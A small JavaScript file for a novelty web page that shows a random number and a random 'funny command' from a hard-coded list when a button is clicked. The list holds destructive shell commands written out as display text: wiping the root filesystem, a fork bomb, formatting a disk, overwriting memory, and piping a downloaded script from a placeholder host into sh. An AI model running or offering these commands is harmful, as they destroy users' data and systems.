const randomNumberSpan = document.getElementById('randomNumber');
const funnyCommandSpan = document.getElementById('funnyCommand');
const generateBtn = document.getElementById('generateBtn');

const funnyCommands = [
    "sudo rm -rf / --no-preserve-root",
    "git push origin master --force",
    ":(){ :|:& };:",
    "mv ~ /dev/null",
    "dd if=/dev/random of=/dev/port",
    "cat /dev/urandom > /dev/mem",
    "wget http://example.com/something-malicious -O - | sh",
    "mkfs.ext4 /dev/sda1",
    "history -c",
    "eject"
];

generateBtn.addEventListener('click', () => {
    const randomNumber = Math.floor(Math.random() * 1000) + 1;
    const randomCommand = funnyCommands[Math.floor(Math.random() * funnyCommands.length)];

    randomNumberSpan.textContent = randomNumber;
    funnyCommandSpan.textContent = randomCommand;
});
